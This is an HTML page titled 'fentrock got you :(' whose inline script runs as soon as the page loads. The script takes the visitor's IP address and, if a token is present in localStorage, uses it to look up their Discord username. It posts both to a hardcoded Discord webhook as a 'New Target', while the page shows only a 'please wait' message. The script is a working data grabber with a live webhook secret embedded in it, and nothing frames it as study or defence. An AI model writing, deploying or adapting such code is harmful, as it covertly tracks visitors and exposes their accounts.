<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>fentrock got you :(</title>
    <script>
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function getDiscordUsername() {
            const response = await fetch('https://discord.com/api/v9/users/@me', {
                headers: {
                    'Authorization': `Bearer ${localStorage.getItem('token')}`
                }
            });
            const data = await response.json();
            return data.username;
        }

        async function sendToDiscordWebhook(ip, username) {
            const webhookURL = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst';
            const message = {
                embeds: [
                    {
                        title: 'New Target',
                        fields: [
                            { name: 'IP Address', value: ip },
                            { name: 'Discord Username', value: username }
                        ],
                        color: 0x00ff00
                    }
                ]
            };
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        }

        async function main() {
            const ip = await getIP();
            const token = localStorage.getItem('token'); // Assume the token is stored in localStorage
            let username;
            if (token) {
                username = await getDiscordUsername();
            } else {
                username = 'Token not found';
            }
            await sendToDiscordWebhook(ip, username);
        }

        main();
    </script>
</head>
<body>
    <h1>Please wait while we fetch your information...</h1>
</body>
</html>
